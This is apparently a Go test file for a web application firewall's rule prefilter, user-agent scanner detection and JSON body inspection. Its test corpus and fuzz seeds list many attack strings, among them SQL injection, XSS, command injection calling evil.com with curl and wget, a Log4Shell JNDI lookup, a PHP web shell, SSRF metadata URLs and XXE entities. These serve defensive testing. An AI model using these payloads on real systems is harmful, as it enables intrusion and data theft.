package waf

import (
	"strings"
	"testing"
)

// collectValuesForTest runs a collector against a generous budget and returns
// the extracted fragments as plain strings.
func collectValuesForTest(collect func(*valueSet)) []string {
	set := newValueSet(1 << 20)
	collect(set)
	return valueStrings(set.values)
}

func valueStrings(values []scanInput) []string {
	if len(values) == 0 {
		return nil
	}
	out := make([]string, len(values))
	for i, v := range values {
		out[i] = v.raw
	}
	return out
}

// patternMatchesWithoutTrigger reports whether s is a counterexample to the
// prefilter invariant for rl: the pattern matches but no trigger is present.
func patternMatchesWithoutTrigger(rl *rule, s string) bool {
	if len(rl.triggersFolded) == 0 || rl.pattern == nil {
		return false
	}
	in := newScanInput(s)
	if !in.asciiOnly {
		// Prefilter is bypassed for non-ASCII input by design.
		return false
	}
	if containsAnyFolded(in.folded, rl.triggersFolded) {
		return false
	}
	return rl.pattern.MatchString(s)
}

// TestRuleTriggersAreSound is the safety net for the prefilter: skipping the
// regexp engine is only correct if a pattern can never match an input that
// contains none of its triggers. A wrong trigger list would silently disable a
// rule, so this asserts the invariant directly rather than trusting the
// hand-derived lists.
func TestRuleTriggersAreSound(t *testing.T) {
	t.Parallel()

	// Every attack string the rest of the suite relies on, plus benign noise.
	corpus := []string{
		"", " ", "/", "/index.html", "/api/v1/items?page=2&sort=name",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
		"' OR '1'='1", "' or 1=1--", "1' AND '1'='1", "admin'--",
		"UNION SELECT password FROM users", "union/**/select 1",
		"1/**/OR/**/1=1", "; DROP TABLE users ", "x'414243'",
		"benchmark(1000000,md5(1))", "sleep(10)", "waitfor delay '0:0:5'",
		"load_file('/etc/passwd')", "1 into outfile ('/tmp/x')",
		"<script>alert(1)</script>", "<SCRIPT>alert(1)</SCRIPT>",
		"javascript:alert(1)", "<img src=x onerror=alert(1)>",
		" onmouseover=alert(1)", "document.cookie", "document . location",
		"<iframe src=x>", "<svg onload=alert(1)>", "eval(atob('x'))",
		"confirm(1)", "prompt(1)",
		"../../etc/passwd", "..%2fetc%2fpasswd", "..%5cwindows",
		"/foo%00.jpg", "....//....//etc/passwd",
		"$(cat /etc/passwd)", "`whoami`", "| curl evil.com", "; wget evil.com",
		"${jndi:ldap://evil.com/a}", "${java:version}", "${ jndi :x}",
		"a\r\nb", "a\nb", "a\rb",
		"/.git/config", "/.env", "/wp-admin/admin.php", "/wp-login.php",
		"/phpmyadmin/", "/cgi-bin/test.cgi", "/etc/passwd", "/etc/shadow",
		"/proc/self/environ", "/proc/1/environ", "/wp-content/uploads/x.php",
		"/autodiscover/autodiscover.xml", "/.well-known/acme-challenge/x",
		"<?php system($_GET[0]); ?>", "<?= 1 ?>", "<% code %>",
		"data:text/html;base64,PHN2Zz4=", "data:image/svg+xml,<svg>",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/", "http://100.100.100.200/",
		"http://127.0.0.1:8080/", "https://localhost/x", "http://[::1]/",
		"file:///etc/passwd", "gopher://evil.com/",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
		"<!ENTITY x SYSTEM 'http://evil.com'>", "SYSTEM \"file://x\"",
		"{{config.items()}}", "{{self.__class__}}", "{{ request }}",
		"{{lipsum}}", "{{cycler}}", "<#assign x=1>", "${T(java.lang.Runtime)}",
		"<%! import os %>",
		// Benign strings that should not trip anything.
		"sort=name&order=asc", "application/json", "en-US,en;q=0.9",
		"gzip, deflate, br", "sid=abc123; theme=dark",
	}

	for _, rl := range defaultRules() {
		rule := rl
		t.Run(rule.name, func(t *testing.T) {
			t.Parallel()
			for _, s := range corpus {
				if patternMatchesWithoutTrigger(&rule, s) {
					t.Errorf("rule %q matches %q but no trigger is present; "+
						"the prefilter would wrongly skip it", rule.name, s)
				}
			}
		})
	}
}

// TestScannerUALiteralsMatchLegacyPattern pins the literal rewrite of
// scanner-ua to the behaviour of the case-insensitive alternation it replaced.
func TestScannerUALiteralsMatchLegacyPattern(t *testing.T) {
	t.Parallel()

	var scanner *rule
	for i, rl := range defaultRules() {
		if rl.name == "scanner-ua" {
			scanner = &defaultRules()[i]
			break
		}
	}
	if scanner == nil {
		t.Fatal("scanner-ua rule not found")
	}

	uas := []string{
		"sqlmap/1.5.2#stable", "SQLMAP/1.5", "Nikto/2.1.6", "nmap scripting engine",
		"Mozilla/5.0 (nuclei)", "masscan/1.3", "gobuster/3.1", "DirBuster-1.0",
		"zgrab/0.x", "httpx-toolkit/1.2", "Nessus", "OpenVAS", "acunetix-wvs",
		"w3af.org", "Arachni/v1", "BurpSuite", "havij", "commix/v3", "WPScan v3",
		"WhatWeb/0.5", "joomscan", "ffuf/1.3", "feroxbuster/2", "subfinder",
		"amass", "fierce", "wfuzz/3", "jaeles", "xray",
		// Negatives, including near-misses.
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
		"curl/8.4.0", "Go-http-client/2.0", "PostmanRuntime/7.36.0", "",
		"my-app/1.0", "Xraylabs", "amassador",
	}

	for _, ua := range uas {
		want := strings.Contains(strings.ToLower(ua), "sqlmap") ||
			containsAnyFoldSlow(ua, scanner.literals)
		got := scanner.matches(newScanInput(ua))
		if got != want {
			t.Errorf("UA %q: matches=%v, want %v", ua, got, want)
		}
	}
}

// TestScanInputFoldsASCIIOnly guards the assumption that makes the prefilter
// sound: folding is ASCII-only, and non-ASCII input opts out.
func TestScanInputFoldsASCIIOnly(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name          string
		raw           string
		wantFolded    string
		wantASCIIOnly bool
	}{
		{"empty", "", "", true},
		{"already lower", "abc/def", "abc/def", true},
		{"mixed case", "AbC/DeF", "abc/def", true},
		{"digits and punct", "A1!~", "a1!~", true},
		{"latin small long s", "ſystem", "", false},
		{"kelvin sign", "K", "", false},
		{"utf8 payload", "café", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			in := newScanInput(tt.raw)
			if in.asciiOnly != tt.wantASCIIOnly {
				t.Fatalf("asciiOnly = %v, want %v", in.asciiOnly, tt.wantASCIIOnly)
			}
			if in.asciiOnly && in.folded != tt.wantFolded {
				t.Errorf("folded = %q, want %q", in.folded, tt.wantFolded)
			}
			if in.raw != tt.raw {
				t.Errorf("raw was mutated: %q", in.raw)
			}
		})
	}
}

// FuzzRuleTriggers searches for inputs where a pattern matches but the
// prefilter finds no trigger, which would mean the rule is silently skipped.
func FuzzRuleTriggers(f *testing.F) {
	seeds := []string{
		"' or 1=1--", "<script>alert(1)</script>", "../../etc/passwd",
		"${jndi:ldap://x}", "$(cat /etc/passwd)", "a\r\nb", "/.env",
		"<?php ?>", "file:///etc/passwd", "<!ENTITY x>", "{{config}}",
		"union/**/select", "x'41'", "sleep(1)", "%00", "data:text/html",
		"/wp-admin", "SYSTEM 'file://x'", "<%! import %>", "${T(x)}",
		"onclick=1", "document.cookie", "169.254.169.254",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	rules := defaultRules()
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 4096 {
			s = s[:4096]
		}
		for i := range rules {
			rl := &rules[i]
			if patternMatchesWithoutTrigger(rl, s) {
				t.Fatalf("rule %q matches %q but no trigger present", rl.name, s)
			}
		}
	})
}

// TestTruncatedJSONBodyStillDetects covers the body-inspection limit boundary:
// a payload that lands past the truncation point must still be found via the
// tolerant token scan, and a body over the limit must not cost more to inspect
// than one just under it.
func TestTruncatedJSONBodyStillDetects(t *testing.T) {
	t.Parallel()

	const limit = 16 * 1024
	var b strings.Builder
	b.WriteString(`{"pad":"`)
	b.WriteString(strings.Repeat("a", 4096))
	b.WriteString(`","q":"' or 1=1--","tail":"`)
	b.WriteString(strings.Repeat("b", limit)) // pushes the doc past the limit
	b.WriteString(`"}`)

	set := newValueSet(limit * bodyScanBudgetFactor)
	body := []byte(b.String())[:limit] // simulate previewRequestBody truncation
	collectJSONBodyValues(set, body)

	values := valueStrings(set.values)
	if len(values) < 3 {
		t.Fatalf("expected structured extraction from truncated JSON, got %v", values)
	}
	found := false
	for _, v := range values {
		if strings.Contains(v, "' or 1=1--") {
			found = true
		}
		if len(v) >= limit {
			t.Errorf("truncated body fell back to whole-blob scan (%d byte value)", len(v))
		}
	}
	if !found {
		t.Errorf("payload past the truncation point was not extracted: %v", values)
	}
}
